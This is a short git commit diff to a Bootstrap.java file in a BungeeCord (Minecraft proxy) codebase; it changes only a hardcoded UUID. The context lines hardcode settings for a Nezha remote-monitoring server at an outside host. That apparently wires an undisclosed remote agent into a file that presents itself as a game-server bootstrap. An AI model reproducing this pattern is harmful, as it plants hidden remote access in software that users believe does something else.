0fe6beec9bb46dc6284ff7b0e056001c696e2da3
danainiua <banxiaoge@gmail.com>
2026-01-05 18:55:20 +0800

    Update Bootstrap.java

--- bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
+++ bootstrap/src/main/java/net/md_5/bungee/Bootstrap.java
@@ -94,7 +94,7 @@ public class Bootstrap
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+        envVars.put("UUID", "d9ebdb7b-0085-43c9-b660-a42fe00c2930");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nz.bbbub.com:443");
         envVars.put("NEZHA_PORT", "");
